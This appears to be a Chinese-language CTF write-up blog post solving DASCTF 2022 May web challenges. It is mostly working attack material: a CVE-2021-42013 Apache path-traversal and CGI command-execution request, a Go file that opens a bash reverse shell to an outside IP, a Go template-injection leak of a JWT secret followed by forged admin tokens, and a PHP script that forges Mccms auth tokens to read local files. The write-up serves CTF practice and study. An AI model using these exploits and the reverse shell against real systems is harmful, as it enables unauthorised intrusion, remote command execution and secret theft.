+++
title= "Dasctf 2022 May出题人挑战赛"
slug= "Dasctf 2022 May出题人挑战赛"
description= ""
date= "2025-10-09T22:33:49+08:00"
lastmod= "2025-10-09T22:33:49+08:00"
image= ""
license= ""
categories= ["复现"]
tags= ["php","go"]

+++

## 魔法浏览器

看回显包，把编码访控制台里面，修改UA头即可

```http
GET / HTTP/1.1
Host: 4f984dad-c78e-4095-b9eb-5d2edd698cd7.node5.buuoj.cn:81
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Magic/100.0.4896.75
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

![img](1.png)

## Power Cookie

```http
GET /check HTTP/1.1
Host: 8d1d27c2-00ac-4f11-93e6-8236505a46f3.node5.buuoj.cn:81
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Cookie: admin=1;
Accept-Language: zh-CN,zh;q=0.9
Referer: http://8d1d27c2-00ac-4f11-93e6-8236505a46f3.node5.buuoj.cn:81/
Accept-Encoding: gzip, deflate
```

直接修改一下Cookie就可以了

## getme

CVE-2021-42013

```http
GET /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd HTTP/1.1
Host: node5.buuoj.cn:29171
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1
Host: node5.buuoj.cn:29171
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded

echo Content-Type: text/plain; echo; tac /diajgk/djflgak/qweqr/eigopl/fffffflalllallalagggggggggg; uname
```

## hackme

查看源码拿到`/list`端点的位置![img](2.png)

挨个访问发现了这个东西，找一下上传点`/upload`，直接写一个恶意的 users.go

```go
package main

import (
	"bytes"
	"fmt"
	"log"
	"os/exec"
)

var reverseShellPayload = `bash -c 'exec bash -i &>/dev/tcp/10.88.15.85/4444 <&1'`

func main() {
	command := exec.Command("sh", "-c", reverseShellPayload)
	var stdout, stderr bytes.Buffer
	command.Stdout = &stdout
	command.Stderr = &stderr

	err := command.Run()

	if err != nil {
		log.Fatalf("命令执行失败: %s\n标准输出:\n%s\n标准错误:\n%s", err, stdout.String(), stderr.String())
	}
	fmt.Printf("命令成功执行。\n标准输出:\n%s\n标准错误:\n%s\n", stdout.String(), stderr.String())
}
```

## fxxkgo

```dockerfile
FROM golang:1.17

WORKDIR /usr/src/app

ENV GOPROXY https://goproxy.cn,direct

COPY go.mod .
RUN go mod download && go mod verify

COPY main.go .
COPY go.sum .
RUN go build -v -o /usr/local/bin/app ./...

ENV KEY NOKEYFORYOU
ENV FLAG flag{fake_flag}
ENV AMDIN_ID admin
ENV AMDIN_PW NOPWDFORYOU

CMD ["app"]
```

知道了应用目录，

```go
package main

import (
	"encoding/json"
	"fmt"
	"github.com/gin-gonic/gin"
	"github.com/golang-jwt/jwt"
	"os"
	"text/template"
)

type Account struct {
	id         string
	pw         string
	is_admin   bool
	secret_key string
}

type AccountClaims struct {
	Id       string `json:"id"`
	Is_admin bool   `json:"is_admin"`
	jwt.StandardClaims
}

type Resp struct {
	Status bool   `json:"status"`
	Msg    string `json:"msg"`
}

type TokenResp struct {
	Status bool   `json:"status"`
	Token  string `json:"token"`
}

var acc []Account
var secret_key = os.Getenv("KEY")
var flag = os.Getenv("FLAG")
var admin_id = os.Getenv("ADMIN_ID")
var admin_pw = os.Getenv("ADMIN_PW")

func get_account(uid string) Account {
	for i := range acc {
		if acc[i].id == uid {
			return acc[i]
		}
	}
	return Account{}
}
func clear_account() {
	acc = acc[:1]
}

func jwt_encode(id string, is_admin bool) (string, error) {
	claims := AccountClaims{
		id, is_admin, jwt.StandardClaims{},
	}
	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
	return token.SignedString([]byte(secret_key))
}

func jwt_decode(s string) (string, bool) {
	token, err := jwt.ParseWithClaims(s, &AccountClaims{}, func(token *jwt.Token) (interface{}, error) {
		return []byte(secret_key), nil
	})
	if err != nil {
		fmt.Println(err)
		return "", false
	}
	if claims, ok := token.Claims.(*AccountClaims); ok && token.Valid {
		return claims.Id, claims.Is_admin
	}
	return "", false
}


func rootHandler(c *gin.Context) {
	token := c.GetHeader("X-Token")
	if token != "" {
		id, _ := jwt_decode(token)
		acc := get_account(id)
		tpl, err := template.New("").Parse("Logged in as " + acc.id)
		if err != nil {
		}
		tpl.Execute(c.Writer, &acc)
		return
	} else {

		return
	}
}

func flagHandler(c *gin.Context) {
	token := c.GetHeader("X-Token")
	if token != "" {
		id, is_admin := jwt_decode(token)
		if is_admin == true {
			p := Resp{true, "Hi " + id + ", flag is " + flag}
			res, err := json.Marshal(p)
			if err != nil {
			}
			c.JSON(200, string(res))
			return
		} else {
			c.JSON(403, gin.H{
				"code": 403,
				"status": "error",
			})
			return
		}
	}
}

func authHandler(c *gin.Context) {
	uid := c.PostForm("id")
	upw := c.PostForm("pw")
	if uid == "" || upw == "" {
		return
	}
	if len(acc) > 1024 {
		clear_account()
	}
	user_acc := get_account(uid)
	if user_acc.id != "" && user_acc.pw == upw {
		token, err := jwt_encode(user_acc.id, user_acc.is_admin)
		if err != nil {
			return
		}
		p := TokenResp{true, token}
		res, err := json.Marshal(p)
		if err != nil {
		}
		c.JSON(200, string(res))
		return
	}
	c.JSON(403, gin.H{
		"code": 403,
		"status": "error",
	})
	return
}


func Resist(c *gin.Context){
	uid := c.PostForm("id")
	upw := c.PostForm("pw")
	if uid == "" || upw == "" {
		return
	}
	if get_account(uid).id != "" {
		c.JSON(403, gin.H{
			"code": 403,
			"status": "error",
		})
		return
	}
	if len(acc) > 4 {
		clear_account()
	}
	new_acc := Account{uid, upw, false, secret_key}
	acc = append(acc, new_acc)

	p := Resp{true, ""}
	res, err := json.Marshal(p)
	if err != nil {
	}
	c.JSON(200, string(res))
	return
}
func index(c *gin.Context) {
	c.JSON(200,gin.H{
		"msg": "Hello World",
	})
}

func main()  {
	admin := Account{admin_id, admin_pw, true, secret_key}
	acc = append(acc, admin)
	r := gin.Default()
	r.GET("/",index)
	r.POST("/", rootHandler)
	r.POST("/flag", flagHandler)
	r.POST("/auth", authHandler)
	r.POST("/register", Resist)
	r.Run(":80")

}
```

主要就是鉴权的判断，观察到一个函数里面有SSTI漏洞，要理解这个漏洞，首先要明白 Go 的 `text/template` 包是如何工作的：

1. `.Parse()` **的作用**：这个函数用来**解析和编译模板字符串**。它会把字符串中的 `{{ ... }}` 语法识别为模板的**指令（代码）**，而不是普通文本。
2. `.Execute()` **的作用**：这个函数用来执行已经编译好的模板，并将**数据**安全地填充到模板指定的位置。

漏洞的根本原因在于，程序将用户可以控制的数据 (`acc.id`) 与一个固定的字符串进行了拼接，然后将拼接后的结果整个传递给了 `.Parse()` 函数。

![img](3.png)

我们可以利用这个洞去获得secret_key。

```http
POST /register HTTP/1.1
Host: 454e5d31-0020-4007-9d3a-a8b300f4660c.node5.buuoj.cn:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded

id={{.}}&pw=123
```

```http
POST /auth HTTP/1.1
Host: 454e5d31-0020-4007-9d3a-a8b300f4660c.node5.buuoj.cn:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded

id={{.}}&pw=123
```

把回显包里面的token用起来

```http
POST / HTTP/1.1
Host: 454e5d31-0020-4007-9d3a-a8b300f4660c.node5.buuoj.cn:81
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
X-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7Ln19IiwiaXNfYWRtaW4iOmZhbHNlfQ.1c8I_PzGiyonSZe3UPM2AB94x07g6DeyJW6uYA2C7eo
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
```

拿到了key为 fasdf972u1041xu90zm10Av 把jwt改了就行

```http
POST /flag HTTP/1.1
Host: 454e5d31-0020-4007-9d3a-a8b300f4660c.node5.buuoj.cn:81
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
X-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7Ln19IiwiaXNfYWRtaW4iOnRydWV9.Lebcn5sry2QGKTbfbZ3pFhUvV9PNAvz0bj55K7IOaQg
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
```

## ezcms

这类CMS就是难定位，不过这个比较简单。

`sys/libs/db.php` 中 Mc_Encryption_Key 为 GKwHuLj9AOhaxJ2 。

定位到`getcurl`

![img](4.png)

看到usage，发现到`sys/apps/controllers/api/Qpic.php`

```php
<?php
/*
'软件名称：漫城CMS（Mccms）
'官方网站：http://www.mccms.cn/
'软件作者：桂林崇胜网络科技有限公司（By:烟雨江南）
'--------------------------------------------------------
'Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
'遵循Apache2开源协议发布，并提供免费使用。
'--------------------------------------------------------
*/
defined('BASEPATH') OR exit('No direct script access allowed');

class Qpic extends Mccms_Controller {

	public function __construct(){
		parent::__construct();
	}
  
    public function img() {
        $str = $this->input->get('str');
		$url = sys_auth($str,1);
		$data = getcurl($url);
		header("Content-Type:image/jpeg");
        echo $data;
	}
}
```

前面还有个鉴权，过了就能任意文件读取了。

```php
function sys_auth($string, $type = 0, $key = '', $expiry = 0) {
	if(is_array($string)) $string = json_encode($string);
	if($type == 1) $string = str_replace('-','+',$string);
	$ckey_length = 4;
	$key = md5($key ? $key : Mc_Encryption_Key);
	$keya = md5(substr($key, 0, 16));
	$keyb = md5(substr($key, 16, 16));
	$keyc = $ckey_length ? ($type == 1 ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';
	$cryptkey = $keya.md5($keya.$keyc);
	$key_length = strlen($cryptkey);
	$string = $type == 1 ? base64_decode(substr($string, $ckey_length)) :  sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
	$string_length = strlen($string);
	$result = '';
	$box = range(0, 255);
	$rndkey = array();
	for($i = 0; $i <= 255; $i++) {
		$rndkey[$i] = ord($cryptkey[$i % $key_length]);
	}
	for($j = $i = 0; $i < 256; $i++) {
		$j = ($j + $box[$i] + $rndkey[$i]) % 256;
		$tmp = $box[$i];
		$box[$i] = $box[$j];
		$box[$j] = $tmp;
	}
	for($a = $j = $i = 0; $i < $string_length; $i++) {
		$a = ($a + 1) % 256;
		$j = ($j + $box[$a]) % 256;
		$tmp = $box[$a];
		$box[$a] = $box[$j];
		$box[$j] = $tmp;
		$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
	} 
	if($type == 1) {
		if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
			$result = substr($result, 26);
			$json = json_decode($result,1);
			if(!is_numeric($result) && $json){
				return $json;
			}else{
				return $result;
			}
		}
		return '';
	}
	return str_replace('+', '-', $keyc.str_replace('=', '', base64_encode($result)));
}
```

写出加密脚本即可

```php
<?php

define('Mc_Encryption_Key', 'GKwHuLj9AOhaxJ2');


function sys_auth($string, $type = 0, $key = '', $expiry = 0) {
    if(is_array($string)) $string = json_encode($string);
    if($type == 1) $string = str_replace('-','+',$string);
    $ckey_length = 4;
    $key = md5($key ? $key : Mc_Encryption_Key);
    $keya = md5(substr($key, 0, 16));
    $keyb = md5(substr($key, 16, 16));
    $keyc = $ckey_length ? ($type == 1 ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';
    $cryptkey = $keya.md5($keya.$keyc);
    $key_length = strlen($cryptkey);
    $string = $type == 1 ? base64_decode(substr($string, $ckey_length)) :  sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
    $string_length = strlen($string);
    $result = '';
    $box = range(0, 255);
    $rndkey = array();
    for($i = 0; $i <= 255; $i++) {
        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
    }
    for($j = $i = 0; $i < 256; $i++) {
        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
        $tmp = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
    }
    for($a = $j = $i = 0; $i < $string_length; $i++) {
        $a = ($a + 1) % 256;
        $j = ($j + $box[$a]) % 256;
        $tmp = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
    }
    if($type == 1) {
        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
            $result = substr($result, 26);
            $json = json_decode($result,1);
            if(!is_numeric($result) && $json){
                return $json;
            }else{
                return $result;
            }
        }
        return '';
    }
    return str_replace('+', '-', $keyc.str_replace('=', '', base64_encode($result)));
}

$str='file:///flag';
$a=sys_auth($str,0);
echo $a;


// /index.php/api/qpic/img?str=deecYbCv7Td82UQYRC/oPO9UTwIz9t8BWbJgYXLnHpVRscNHfQ3b4eA
```
